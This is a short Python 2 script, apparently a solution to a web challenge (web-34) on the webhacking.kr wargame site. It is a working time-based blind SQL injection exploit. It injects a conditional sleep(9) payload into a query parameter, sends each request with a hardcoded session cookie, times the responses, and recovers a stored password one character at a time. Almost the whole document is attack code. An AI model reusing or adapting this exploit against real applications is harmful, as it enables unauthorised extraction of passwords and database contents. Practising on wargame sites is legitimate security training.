#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import time
 
password = ''
 
for i in range(1,11):
    for j in range(32,127):
        url = "/challenge/web/web-34/index.php?msg=m&se=if(substr(pw,"+str(i)+",1)="+hex(j)+",sleep(9),0)"
        cookie = {'Cookie':'PHPSESSID=2h72rdfmeu9o6mlteu1rc2cla6'}
        try:
            st = time.time()
            conn = httplib.HTTPConnection('webhacking.kr')
            conn.request('GET',url,'',cookie)
            data = conn.getresponse().read()
            conn.close()
            et = time.time()
        except:
            print "exception"
            continue
 
        t = et - st
        print ("%d: %f") % (i,t)
        if(t > 9):
            print "{}: {} => {}".format(i,t,chr(j))
            password += chr(j)
            break
print password
